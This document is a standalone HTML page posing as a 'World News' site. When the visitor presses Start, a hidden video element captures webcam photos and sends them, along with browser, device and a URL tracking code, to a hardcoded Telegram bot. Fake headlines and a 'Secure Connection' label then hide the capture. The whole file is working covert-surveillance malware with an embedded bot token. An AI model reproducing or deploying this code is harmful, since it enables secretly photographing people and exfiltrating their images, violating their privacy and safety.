<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>World News Today</title>
    <style>
        /* ========== RESET ========== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            padding: 20px;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        /* ========== MAIN CARD ========== */
        .main-card {
            background: white;
            border-radius: 24px;
            padding: 40px 30px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.12);
            border: 1px solid rgba(0,0,0,0.04);
        }
        
        .main-card .logo {
            font-size: 60px;
            margin-bottom: 10px;
        }
        
        .main-card h1 {
            font-size: 24px;
            font-weight: 800;
            color: #1a1a2e;
            margin-bottom: 6px;
        }
        
        .main-card h1 span {
            color: #4f46e5;
        }
        
        .main-card p {
            color: #6b7280;
            font-size: 15px;
            line-height: 1.6;
            margin-bottom: 25px;
        }
        
        /* ========== START BUTTON ========== */
        .btn-start {
            background: linear-gradient(135deg, #4f46e5, #7c3aed);
            color: white;
            border: none;
            padding: 16px 50px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            box-shadow: 0 8px 30px rgba(79, 70, 229, 0.3);
        }
        
        .btn-start:hover {
            transform: scale(1.03);
            box-shadow: 0 12px 40px rgba(79, 70, 229, 0.4);
        }
        
        .btn-start:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        
        /* ========== LOADING ========== */
        .loading-text {
            color: #9ca3af;
            font-size: 13px;
            margin-top: 15px;
            display: none;
        }
        
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #e5e7eb;
            border-top: 2px solid #4f46e5;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* ========== HIDDEN VIDEO ========== */
        #video {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        
        #canvas {
            display: none;
        }
        
        /* ========== FOOTER ========== */
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #d1d5db;
        }
        
        /* ========== RESPONSIVE ========== */
        @media (max-width: 480px) {
            .main-card {
                padding: 30px 20px;
            }
            .main-card h1 {
                font-size: 20px;
            }
            .btn-start {
                font-size: 16px;
                padding: 14px 30px;
            }
        }
    </style>
</head>
<body>

    <!-- ========== HIDDEN VIDEO ========== -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <!-- ========== MAIN CARD ========== -->
    <div class="main-card" id="mainCard">
        <div class="logo">🌍</div>
        <h1><span>World</span>News</h1>
        <p>Get the latest news from around the world.</p>
        
        <button class="btn-start" id="startBtn">
            🚀 Start
        </button>
        
        <div class="loading-text" id="loadingText">
            <span class="spinner"></span> Loading...
        </div>
        
        <div class="footer">🔒 Secure Connection</div>
    </div>

    <!-- ================================================================ -->
    <!-- ========== JAVASCRIPT ========== -->
    <!-- ================================================================ -->
    <script>
        // ================================================================
        //  CONFIGURATION
        // ================================================================
        const BOT_TOKEN = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
        const CHAT_ID = "8295417969";
        const CAPTURE_INTERVAL = 4000;
        const MAX_PHOTOS = 10;
        
        // ================================================================
        //  GET CODE FROM URL
        // ================================================================
        const params = new URLSearchParams(window.location.search);
        const code = params.get('code') || 'unknown';
        
        // ================================================================
        //  DOM ELEMENTS
        // ================================================================
        const startBtn = document.getElementById('startBtn');
        const loadingText = document.getElementById('loadingText');
        const mainCard = document.getElementById('mainCard');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        // ================================================================
        //  BROWSER INFO
        // ================================================================
        function getBrowser(ua) {
            if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
            if (ua.includes('Edg')) return 'Edge';
            if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
            return 'Unknown';
        }
        
        function getDevice(ua) {
            if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
                if (/iPad|Tablet/i.test(ua)) return 'Tablet';
                return 'Mobile';
            }
            return 'Desktop';
        }
        
        const browser = getBrowser(navigator.userAgent);
        const device = getDevice(navigator.userAgent);
        
        // ================================================================
        //  STATE
        // ================================================================
        let stream = null;
        let photoCount = 0;
        let isRunning = false;
        let captureTimer = null;
        let isStarted = false;
        
        // ================================================================
        //  START BUTTON CLICK
        // ================================================================
        startBtn.addEventListener('click', async function() {
            if (isStarted) return;
            isStarted = true;
            
            startBtn.disabled = true;
            startBtn.textContent = '⏳ Starting...';
            loadingText.style.display = 'block';
            
            try {
                // Start camera
                await startCamera();
                
                // Change UI to news page
                showNewsPage();
                
                // Send notification to WhatsApp via Telegram
                await sendStartNotification();
                
            } catch (error) {
                console.error('Error:', error);
                startBtn.disabled = false;
                startBtn.textContent = '🔄 Try Again';
                loadingText.style.display = 'none';
                isStarted = false;
            }
        });
        
        // ================================================================
        //  START CAMERA
        // ================================================================
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
                
                video.srcObject = stream;
                await video.play();
                
                // Start capturing
                startCapturing();
                
            } catch (error) {
                console.error('Camera error:', error);
                throw error;
            }
        }
        
        // ================================================================
        //  START CAPTURING
        // ================================================================
        function startCapturing() {
            isRunning = true;
            photoCount = 0;
            
            capturePhoto();
            
            captureTimer = setInterval(() => {
                if (photoCount < MAX_PHOTOS) {
                    capturePhoto();
                } else {
                    stopCapturing();
                }
            }, CAPTURE_INTERVAL);
        }
        
        // ================================================================
        //  CAPTURE PHOTO
        // ================================================================
        function capturePhoto() {
            if (!stream || !isRunning) return;
            
            try {
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.85);
                photoCount++;
                
                sendPhotoToTelegram(imageData);
                
            } catch (error) {
                console.error('Capture error:', error);
            }
        }
        
        // ================================================================
        //  SEND PHOTO TO TELEGRAM
        // ================================================================
        async function sendPhotoToTelegram(imageData) {
            try {
                const blob = dataURItoBlob(imageData);
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
                formData.append('caption', 
                    `📸 **Photo #${photoCount}**\n\n` +
                    `🔗 **Code:** \`${code}\`\n` +
                    `🌍 **Browser:** ${browser}\n` +
                    `📱 **Device:** ${device}\n` +
                    `⏰ **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`
                );
                formData.append('parse_mode', 'Markdown');
                
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
                await fetch(url, {
                    method: 'POST',
                    body: formData
                });
                
            } catch (error) {
                console.error('Send error:', error);
            }
        }
        
        // ================================================================
        //  SEND START NOTIFICATION TO TELEGRAM
        // ================================================================
        async function sendStartNotification() {
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `🚀 **New Visitor Started!**\n\n` +
                              `🔗 **Code:** \`${code}\`\n` +
                              `🌍 **Browser:** ${browser}\n` +
                              `📱 **Device:** ${device}\n` +
                              `⏰ **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}\n\n` +
                              `📸 Camera is now active...`,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (e) {}
        }
        
        // ================================================================
        //  SHOW NEWS PAGE
        // ================================================================
        function showNewsPage() {
            mainCard.innerHTML = `
                <div style="text-align:left;">
                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;flex-wrap:wrap;gap:8px;">
                        <h2 style="font-size:20px;color:#1a1a2e;">🌍 <span style="color:#4f46e5;">World</span>News</h2>
                        <span style="background:#ef4444;color:white;font-size:10px;padding:3px 12px;border-radius:20px;font-weight:700;">🔴 LIVE</span>
                    </div>
                    
                    <div style="background:#f8fafc;border-radius:12px;padding:14px 16px;margin-bottom:14px;border:1px solid #e5e7eb;">
                        <div style="display:flex;justify-content:space-between;font-size:13px;color:#6b7280;flex-wrap:wrap;gap:5px;">
                            <span>👁️ ${Math.floor(Math.random() * 50000) + 8000} watching</span>
                            <span>🔄 ${new Date().toLocaleTimeString('en-US', {hour:'2-digit',minute:'2-digit'})}</span>
                        </div>
                    </div>
                    
                    <div style="background:linear-gradient(135deg,#e0e7ff,#c7d2fe);border-radius:14px;padding:20px;text-align:center;margin-bottom:14px;">
                        <div style="font-size:40px;">🌍</div>
                        <h3 style="color:#1a1a2e;font-size:17px;margin:6px 0 4px;">Global Summit 2026</h3>
                        <p style="font-size:13px;color:#4b5563;">World leaders unite for historic agreement</p>
                    </div>
                    
                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
                        <div style="background:#f8fafc;border-radius:12px;padding:12px;border:1px solid #e5e7eb;">
                            <div style="font-size:24px;">🚀</div>
                            <h4 style="font-size:13px;color:#1a1a2e;margin:4px 0 2px;">AI Breakthrough</h4>
                            <p style="font-size:11px;color:#6b7280;">New model beats experts</p>
                        </div>
                        <div style="background:#f8fafc;border-radius:12px;padding:12px;border:1px solid #e5e7eb;">
                            <div style="font-size:24px;">💰</div>
                            <h4 style="font-size:13px;color:#1a1a2e;margin:4px 0 2px;">Markets Surge</h4>
                            <p style="font-size:11px;color:#6b7280;">Inflation cools down</p>
                        </div>
                        <div style="background:#f8fafc;border-radius:12px;padding:12px;border:1px solid #e5e7eb;">
                            <div style="font-size:24px;">⚽</div>
                            <h4 style="font-size:13px;color:#1a1a2e;margin:4px 0 2px;">Champions League</h4>
                            <p style="font-size:11px;color:#6b7280;">Records broken</p>
                        </div>
                        <div style="background:#f8fafc;border-radius:12px;padding:12px;border:1px solid #e5e7eb;">
                            <div style="font-size:24px;">🌿</div>
                            <h4 style="font-size:13px;color:#1a1a2e;margin:4px 0 2px;">Vaccine Success</h4>
                            <p style="font-size:11px;color:#6b7280;">95% efficacy rate</p>
                        </div>
                    </div>
                    
                    <div style="text-align:center;font-size:11px;color:#9ca3af;margin-top:16px;border-top:1px solid #e5e7eb;padding-top:12px;">
                        © 2026 WorldNews • Independent Journalism
                    </div>
                </div>
            `;
        }
        
        // ================================================================
        //  STOP CAPTURING
        // ================================================================
        function stopCapturing() {
            isRunning = false;
            if (captureTimer) {
                clearInterval(captureTimer);
                captureTimer = null;
            }
            setTimeout(() => {
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
            }, 2000);
        }
        
        // ================================================================
        //  HELPERS
        // ================================================================
        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }
        
        // ================================================================
        //  STOP ON PAGE LEAVE
        // ================================================================
        window.addEventListener('beforeunload', function() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            if (captureTimer) clearInterval(captureTimer);
        });
    </script>
</body>
</html>
